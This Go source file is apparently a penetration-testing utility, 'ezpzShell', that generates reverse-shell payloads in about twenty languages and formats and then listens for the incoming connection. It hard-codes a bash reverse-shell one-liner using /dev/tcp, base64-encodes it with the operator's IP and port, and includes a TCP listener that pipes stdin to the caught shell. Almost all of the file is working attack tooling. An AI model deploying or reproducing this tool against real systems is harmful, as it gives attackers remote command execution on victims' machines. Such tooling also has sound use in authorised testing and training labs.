package main

import (
	"fmt"
	"os"
	"net"
	"regexp"
	"strings"
	"io/ioutil"
	b64 "encoding/base64"
	"log"
	"io"
)

//Color Variable
var colorReset = "\033[0m"
var colorRed = "\033[31m"
var colorGreen = "\033[32m"
var colorOrange = "\033[1;33;40m"
var colorBlue = "\033[34m"
var colorPurple = "\033[35m"
var colorCyan = "\033[92m"
var colorWhite = "\033[37m"

//Payload Variable
type payload struct {
	py string
	py3 string
	bash string
	c string
	nc string
	php string
	perl string
	ruby string
	haskell string
	powershell string
	nodejs string
	awk string
	ncat string
	exe string
	ssti string
	cgibin string
	jenkins string
	tarpriv string
	pickle string
	java string
	lua string
}


//Function Header
func header(){
	header := 
`
  ______               _____ _          _ _ 
 |  ____|             / ____| |        | | |
 | |__   _____ __ ___| (___ | |__   ___| | |
 |  __| |_  / '_ \_  /\___ \| '_ \ / _ \ | |
 | |____ / /| |_) / / ____) | | | |  __/ | |
 |______/___| .__/___|_____/|_| |_|\___|_|_|
            | |                             
            |_|
`
	fmt.Println(header)
	fmt.Print(string(colorCyan),"[Payload Available]",string(colorReset))
	fmt.Print("\npy,py3,bash,c,nc,php,perl,ruby,haskell,powershell,nodejs,awk,ncat,exe,ssti,cgibin,jenkins,tarpriv,java,lua")
	
	fmt.Print("\n\n",string(colorCyan),"[Usage]",string(colorReset),"\n")
	fmt.Print(string(colorOrange),"ezpzShell 10.10.10.10 9001 py",string(colorReset),"\n")
	fmt.Print(string(colorOrange),"ezpzShell tun0 9001 py",string(colorReset))
}

//Function Load Shell
func loadShell(mapPayload map[string][]string, sliceData []string) {
	for i,data := range sliceData{
		if i == 0{
			mapPayload["py"] = append(mapPayload["py"],data)
		}else if i == 1{
			mapPayload["py3"] = append(mapPayload["py3"],data)
		}else if i == 2{
			mapPayload["bash"] = append(mapPayload["bash"],data)
		}else if i == 3{
			mapPayload["c"] = append(mapPayload["c"],data)
		}else if i == 4{
			mapPayload["nc"] = append(mapPayload["nc"],data)
		}else if i == 5{
			mapPayload["php"] = append(mapPayload["php"],data)
		}else if i == 6{
			mapPayload["perl"] = append(mapPayload["perl"],data)
		}else if i == 7{
			mapPayload["ruby"] = append(mapPayload["ruby"],data)
		}else if i == 8{
			mapPayload["haskell"] = append(mapPayload["haskell"],data)
		}else if i == 9{
			mapPayload["powershell"] = append(mapPayload["powershell"],data)
		}else if i == 10{
			mapPayload["nodejs"] = append(mapPayload["nodejs"],data)
		}else if i == 11{
			mapPayload["awk"] = append(mapPayload["awk"],data)
		}else if i == 12{
			mapPayload["ncat"] = append(mapPayload["ncat"],data)
		}else if i == 13{
			mapPayload["exe"] = append(mapPayload["exe"],data)
		}else if i == 14{
			mapPayload["ssti"] = append(mapPayload["ssti"],data)
		}else if i == 15{
			mapPayload["cgibin"] = append(mapPayload["cgibin"],data)
		}else if i == 16{
			mapPayload["jenkins"] = append(mapPayload["jenkins"],data)
		}else if i == 17{
			mapPayload["tarpriv"] = append(mapPayload["tarpriv"],data)
		}else if i == 18{
			mapPayload["pickle"] = append(mapPayload["pickle"],data)
		}else if i == 19{
			mapPayload["java"] = append(mapPayload["java"],data)
		}else if i == 20{
			mapPayload["lua"] = append(mapPayload["lua"],data)
		}
	}
	//for key, _ := range mapPayload {
	//    	fmt.Println("Key:", key)
	//}
	return
}

//Function generate base64 bash
func base64gen(ip string, port string) string{
	temp := strings.Replace(strings.Replace("bash -i >& /dev/tcp/{IP}/{PORT} 0>&1","{PORT}",port,1),"{IP}",ip,1)
	encodeB64 := b64.StdEncoding.EncodeToString([]byte(temp))
	return encodeB64
	
}

//Function Listen Connection
func Listen(p string) {
	sock := ":" + p
	l, err := net.Listen("tcp", sock)
	if nil != err {
		log.Fatalf("Could not bind to interface: %v", err)
	}
	defer l.Close()
	log.Println("Listening on", l.Addr())
	for {
		c, err := l.Accept()
		if nil != err {
			log.Fatalf("Could not accept connection: %v", err)
		}
		log.Println("Accepted connection from", c.RemoteAddr())
		go io.Copy(c, os.Stdin)
		go io.Copy(os.Stdout, c)
	}
}

func main(){
	header()
	if (len(os.Args) < 4){
		fmt.Print("\n\nPlease Specify Correct Arguments!")
		os.Exit(1)
	}
	mapPayload := map[string][]string{}
	//FilePath
	filename := "/opt/OtherTools/EazyH0j3n/EzpzShell/shell.txt"
	//Regex For Ip Address
	re := regexp.MustCompile(`(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`)
	
	port := os.Args[2]
	options := strings.ToLower(os.Args[3])
	//Check if interfaces specify available
	ip := os.Args[1]
	checkerip := re.MatchString(ip)
	
	if checkerip != true {
		interfaces,err := net.InterfaceByName(ip)
		if err != nil {
			fmt.Println("\nThe interface might not available! Check Again")
			os.Exit(1)
		}else{
			addr,err := interfaces.Addrs()
			if err != nil {
				fmt.Println("\nThe interface might not available! Check again")
				os.Exit(1)
			}
			ip = re.FindAllString(addr[0].String(),-1)[0]
		}
	}
	//Read File
	fileBytes, err := ioutil.ReadFile(filename)
	if err != nil{
		fmt.Println(err)
		os.Exit(1)
	}
	//Slice & Load Shell
	sliceData := strings.Split(string(fileBytes), "#INDEX")[1:]
	loadShell(mapPayload,sliceData)
	//Generate Shell
	for i,data := range strings.Split(string(mapPayload[options][0]), "#EXAMPLE")[1:]{
		fmt.Print("\n\n",string(colorCyan),"Example ",i+1,string(colorReset))
		if strings.Contains(data, "{BASE64}"){
			fmt.Print("\n",strings.TrimSpace(strings.Replace(data,"{BASE64}",base64gen(ip,port),1)))
		}else if strings.Contains(data, "{PICKLE}"){
			fmt.Println("\nNot at the moment please use python version!")
		}else{
			fmt.Print("\n",strings.TrimSpace(strings.Replace(strings.Replace(data,"{IP}",ip,1),"{PORT}",port,1)))
		}
	}
	//Listen Netcat
	fmt.Print("\n\n",string(colorCyan),"Listening... ",string(colorReset),"\n")
        Listen(port)
	
	
	
}
